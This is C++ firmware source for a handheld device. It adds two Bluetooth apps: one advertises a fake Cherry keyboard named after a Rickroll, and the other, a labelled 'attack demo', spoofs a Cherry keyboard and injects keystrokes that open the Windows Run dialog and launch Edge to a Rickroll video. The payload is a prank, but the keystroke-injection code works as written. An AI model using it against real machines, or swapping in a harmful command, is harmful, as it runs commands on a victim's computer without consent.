#include "cpp_app.h"
#include "controls.h"

#if __has_include("security_config.h")
    #include "security_config.h"
#else
    #define ENABLE_BLE 0
#endif

#if ENABLE_BLE

#include <BleKeyboard.h>

// Device name defines - keeping them short for BLE packet limits
#define BLE_MANUFACTURER "CHERRY"
#define BLE_RICKROLL_NAME "Never Gonna Giv U Up"
#define BLE_ATTACK_NAME "MX Board 3.0"

BleKeyboard* bleKeyboard = nullptr;

// Simple BLE Rickroller - advertises as a legitimate-looking Cherry keyboard
CPP_APP(ble_rickroller) {
    Serial.println("BLE Rickroller: Starting...");
    
    // Clean up any previous BLE
    if (bleKeyboard) {
        Serial.println("BLE Rickroller: Cleaning up old keyboard");
        bleKeyboard->end();
        delete bleKeyboard;
        bleKeyboard = nullptr;
        delay(1000);
        Serial.println("BLE Rickroller: Cleanup complete");
    }
    
    CppApp::clear();
    CppApp::println("BLE Rickroller");
    CppApp::println("");
    CppApp::println("Initializing...");
    CppApp::println("L: Cancel");
    CppApp::refresh();
    
    // Allow canceling during the wait
    for (int i = 0; i < 10; i++) {
        updateControls();
        if (isLeftPressed()) {
            Serial.println("BLE Rickroller: Canceled");
            return;
        }
        delay(50);
    }
    
    Serial.println("BLE Rickroller: Creating keyboard");
    bleKeyboard = new BleKeyboard(BLE_RICKROLL_NAME, BLE_MANUFACTURER, 100);
    
    delay(500); // Give BLE stack time to initialize
    
    Serial.println("BLE Rickroller: Starting advertising");
    bleKeyboard->begin();
    
    CppApp::clear();
    CppApp::println("BLE Rickroller");
    CppApp::println("");
    CppApp::println("Device:");
    CppApp::println("Never Gonna");
    CppApp::println("Giv U Up");
    CppApp::println("");
    CppApp::println("Mfg: " BLE_MANUFACTURER);
    CppApp::println("");
    CppApp::println("L: Exit");
    CppApp::refresh();
    
    Serial.println("BLE Rickroller: Running");
    
    while (!CppApp::shouldExit()) {
        updateControls();
        if (isLeftPressed()) {
            break;
        }
        delay(100);
    }
    
    Serial.println("BLE Rickroller: Cleaning up");
    bleKeyboard->end();
    delay(500); // Give BLE stack time to clean up
    delete bleKeyboard;
    bleKeyboard = nullptr;
    Serial.println("BLE Rickroller: Exiting");
}

REGISTER_CPP_APP(ble_rickroller, "/Applications/BLE/Rickroller");

// BLE Keyboard Attack - Educational demonstration of BLE HID attacks

CPP_APP(ble_keyboard_attack) {
    Serial.println("BLE Keyboard Attack: Starting...");
    
    // Clean up any previous BLE initialization
    if (bleKeyboard) {
        Serial.println("BLE Keyboard Attack: Cleaning up old keyboard");
        bleKeyboard->end();
        delete bleKeyboard;
        bleKeyboard = nullptr;
        // Wait for BLE stack to fully deinitialize
        delay(1000);
        Serial.println("BLE Keyboard Attack: Cleanup complete");
    }
    
    // Select attack mode
    int selectedMode = 0; // 0 = Manual, 1 = Auto (3s)
    bool modeSelected = false;
    
    CppApp::clear();
    CppApp::println("BLE Keyboard");
    CppApp::println("Attack Demo");
    CppApp::println("");
    CppApp::println("Attack Mode:");
    CppApp::println("> Manual (Btn)");
    CppApp::println("  Auto (3s)");
    CppApp::println("");
    CppApp::println("U/D:Select");
    CppApp::println("Btn:Confirm L:Exit");
    CppApp::refresh();
    
    while (!modeSelected && !CppApp::shouldExit()) {
        updateControls();
        if (isUpPressed() || isDownPressed()) {
            selectedMode = 1 - selectedMode;
            
            CppApp::clear();
            CppApp::println("BLE Keyboard");
            CppApp::println("Attack Demo");
            CppApp::println("");
            CppApp::println("Attack Mode:");
            if (selectedMode == 0) {
                CppApp::println("> Manual (Btn)");
                CppApp::println("  Auto (3s)");
            } else {
                CppApp::println("  Manual (Btn)");
                CppApp::println("> Auto (3s)");
            }
            CppApp::println("");
            CppApp::println("U/D:Select");
            CppApp::println("Btn:Confirm L:Exit");
            CppApp::refresh();
        }
        
        if (isButtonReleased()) {
            modeSelected = true;
            Serial.printf("BLE Keyboard Attack: Mode selected: %s\n", selectedMode == 0 ? "Manual" : "Auto (3s)");
        }
        
        if (isLeftPressed()) {
            Serial.println("BLE Keyboard Attack: Canceled at mode select");
            return;
        }
        
        delay(50);
    }
    
    if (!modeSelected) return;
    
    CppApp::clear();
    CppApp::println("BLE Keyboard");
    CppApp::println("Attack Demo");
    CppApp::println("");
    CppApp::println("Initializing...");
    CppApp::println("L: Cancel");
    CppApp::refresh();
    
    Serial.println("BLE Keyboard Attack: Waiting before init");
    
    // Allow canceling during the wait and give BLE stack time to settle
    for (int i = 0; i < 20; i++) {
        updateControls();
        if (isLeftPressed()) {
            Serial.println("BLE Keyboard Attack: Canceled during wait");
            return;
        }
        delay(100);
    }
    
    Serial.println("BLE Keyboard Attack: Creating BleKeyboard object");
    
    // Initialize BLE Keyboard - looks like a real Cherry keyboard
    bleKeyboard = new BleKeyboard(BLE_ATTACK_NAME, BLE_MANUFACTURER, 100);
    
    // Small delay before calling begin()
    delay(500);
    
    Serial.println("BLE Keyboard Attack: Calling begin()");
    bleKeyboard->begin();
    
    Serial.println("BLE Keyboard Attack: begin() returned");
    
    CppApp::clear();
    CppApp::println("BLE Keyboard");
    CppApp::println("Attack Demo");
    CppApp::println("");
    CppApp::println("Device:");
    CppApp::println(BLE_MANUFACTURER " " BLE_ATTACK_NAME);
    CppApp::println("");
    CppApp::println("Waiting...");
    CppApp::println("");
    CppApp::println("L: Exit");
    CppApp::refresh();
    
    Serial.println("BLE Keyboard Attack: Waiting for connection");
    
    // Wait for connection
    unsigned long startWait = millis();
    bool connected = false;
    
    while (!CppApp::shouldExit()) {
        updateControls();
        if (isLeftPressed()) {
            Serial.println("BLE Keyboard Attack: User exit");
            break;
        }
        
        if (bleKeyboard->isConnected()) {
            Serial.println("BLE Keyboard Attack: Device connected!");
            connected = true;
            break;
        }
        
        // Timeout after 60 seconds
        if (millis() - startWait > 60000) {
            Serial.println("BLE Keyboard Attack: Timeout waiting for connection");
            CppApp::clear();
            CppApp::println("Timeout!");
            CppApp::println("");
            CppApp::println("No device");
            CppApp::println("connected");
            CppApp::println("");
            CppApp::println("L: Exit");
            CppApp::refresh();
            
            while (!CppApp::shouldExit()) {
                updateControls();
                if (isLeftPressed()) break;
                delay(100);
            }
            break;
        }
        
        delay(100);
    }
    
    if (connected && !CppApp::shouldExit()) {
        CppApp::clear();
        CppApp::println("Connected!");
        CppApp::println("");
        if (selectedMode == 0) {
            CppApp::println("Mode: Manual");
            CppApp::println("");
            CppApp::println("Btn: Attack");
        } else {
            CppApp::println("Mode: Auto");
            CppApp::println("");
            CppApp::println("Attacking...");
        }
        CppApp::println("");
        CppApp::println("L: Exit");
        CppApp::refresh();
        
        // Small delay for auto mode before attack
        if (selectedMode == 1) {
            delay(500);
        }
        
        bool attacked = false;
        
        while (!CppApp::shouldExit()) {
            updateControls();
            
            if (isLeftPressed()) {
                break;
            }
            
            // Trigger attack on button press (manual) or immediately after delay (auto)
            if ((selectedMode == 0 && isButtonReleased() && !attacked) || (selectedMode == 1 && !attacked)) {
                attacked = true;
                
                Serial.println("BLE Keyboard Attack: Starting attack sequence");
                
                CppApp::clear();
                CppApp::println("Attack Running");
                CppApp::println("");
                CppApp::println("Please wait...");
                CppApp::refresh();
                
                delay(300);
                
                // Open Windows Run dialog
                Serial.println("BLE Keyboard Attack: Win+R");
                bleKeyboard->press(KEY_LEFT_GUI);
                delay(100);
                bleKeyboard->press('r');
                delay(100);
                bleKeyboard->releaseAll();
                delay(500);
                
                // Open Edge with URL directly
                Serial.println("BLE Keyboard Attack: Typing Edge command");
                // Type slowly to avoid missing characters
                const char* cmd = "msedge https://youtu.be/dQw4w9WgXcQ?t=43";
                for (int i = 0; cmd[i] != '\0'; i++) {
                    bleKeyboard->print(cmd[i]);
                    delay(30); // 30ms per character
                }
                
                delay(200);
                bleKeyboard->press(KEY_RETURN);
                delay(100);
                bleKeyboard->releaseAll();
                
                Serial.println("BLE Keyboard Attack: Attack complete!");
                
                CppApp::clear();
                CppApp::println("Attack");
                CppApp::println("Complete!");
                CppApp::println("");
                CppApp::println("Never gonna");
                CppApp::println("give you up!");
                CppApp::println("");
                CppApp::println("L: Exit");
                CppApp::refresh();
            }
            
            delay(100);
        }
    }
    
    // Cleanup
    Serial.println("BLE Keyboard Attack: Cleaning up");
    if (bleKeyboard) {
        bleKeyboard->end();
        delay(500); // Give BLE stack time to clean up
        delete bleKeyboard;
        bleKeyboard = nullptr;
    }
    Serial.println("BLE Keyboard Attack: Exiting");
}

REGISTER_CPP_APP(ble_keyboard_attack, "/Applications/BLE/Keyboard Attack");

// Function to force cleanup of BLE keyboard (called from Lua BLE code)
void cleanupBLEKeyboard() {
    if (bleKeyboard) {
        Serial.println("BLE: Cleaning up C++ BleKeyboard object");
        bleKeyboard->end();
        delay(500);
        delete bleKeyboard;
        bleKeyboard = nullptr;
        delay(500);
        Serial.println("BLE: C++ BleKeyboard cleanup complete");
    }
}

#endif

void registerBLEApps() {
#if ENABLE_BLE
    registerCppApp("ble_rickroller", "/Applications/BLE/Rickroller", cppapp_ble_rickroller);
    registerCppApp("ble_keyboard_attack", "/Applications/BLE/Keyboard Attack", cppapp_ble_keyboard_attack);
#endif
}

